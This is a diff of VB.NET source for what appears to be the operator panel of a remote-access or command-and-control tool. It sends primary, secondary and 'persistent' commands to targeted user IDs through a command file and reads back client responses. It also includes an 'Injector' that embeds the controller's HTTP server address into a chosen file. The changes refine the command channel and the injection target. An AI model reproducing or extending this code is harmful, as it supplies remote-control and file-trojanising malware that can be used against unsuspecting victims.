@@ -159,7 +159,6 @@ Public Class Main
                     SendCommandFile(userIDTarget, Main_Users_Command_ComboBox.Text)
                 End If
                 Status_Label.Text = Nothing
-                Main_Users_Command_ComboBox.Text = Nothing
                 If IsThreadReadCMDServerRunning = False Then
                     Status_Label.Text = "CMD Response thread started!"
                     ThreadReadCMDServer.Start()
@@ -193,6 +192,7 @@ Public Class Main
                     My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", My.Computer.FileSystem.ReadAllText(LocalCommandFile), False)
                 End If
                 'Leer
+                Dim RAW_Response As String() = IO.File.ReadAllLines(LocalCommandFile)
                 Dim TheResponse As String = LeerFicheroDesdeLinea(6, LocalCommandFile)
                 If TheResponse = LastUserResponse Then
                     If TheResponse <> Nothing Then
@@ -203,7 +203,7 @@ Public Class Main
                 Else
                     LastUserResponse = TheResponse
                     If LastUserResponse <> Nothing Or LastUserResponse <> TheResponse Then
-                        SetCMDStatus(vbCrLf & "Client: " & LastUserResponse, Nothing)
+                        SetCMDStatus(vbCrLf & RAW_Response(0).Split("|")(1) & ": " & LastUserResponse, Nothing)
                     End If
                 End If
             Catch ex As Exception
@@ -222,13 +222,14 @@ Public Class Main
             If My.Computer.FileSystem.FileExists(DIRCommons & "\userCommand.str") Then
                 My.Computer.FileSystem.DeleteFile(DIRCommons & "\userCommand.str")
             End If
+            Dim commandHeader As String = Lineas(0).Trim() 'header
             Dim secundaryCommand As String = Lineas(2).Split(">"c)(1).Trim() 'Comando secundario
             Dim persistentCommand As String = Lineas(3).Split(">"c)(1).Trim() 'Comando persistente
             If Not isMonoChannel Then
                 secundaryCommand = InputBox("Set secundary command", "Multi channel " & userIDTarget, secundaryCommand)
                 persistentCommand = InputBox("Set persistent command", "Multi channel " & userIDTarget, persistentCommand)
             End If
-            My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", "#Command Channel for Unique User" &
+            My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", commandHeader &
                                                     vbCrLf & "Command1>" & command &
                                                     vbCrLf & "Command2>" & secundaryCommand &
                                                     vbCrLf & "Command3>" & persistentCommand &
@@ -239,6 +240,7 @@ Public Class Main
             End If
             LastUserResponse = Nothing
             Main_Users_Command_RichTextBox.ScrollToCaret()
+            Main_Users_Command_ComboBox.Text = Nothing
         Catch ex As Exception
             Status_Label.Text = AddToLog("SendCommandFile@Main", "Error: " & ex.Message, True)
         End Try
@@ -286,7 +288,7 @@ Public Class Main
                     PutInject(Main_Inject_TextBox.Text, injectableOpener.FileName, injectableSaver.FileName)
                 Else
                     If MessageBox.Show("No ha ingresado un servidor para inyectar." & vbCrLf & "¿Desea usar el servidor actual?", "Injector", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
-                        PutInject(OwnerServer, injectableOpener.FileName, injectableSaver.FileName)
+                        PutInject(HttpOwnerServer, injectableOpener.FileName, injectableSaver.FileName)
                     End If
                 End If
             End If
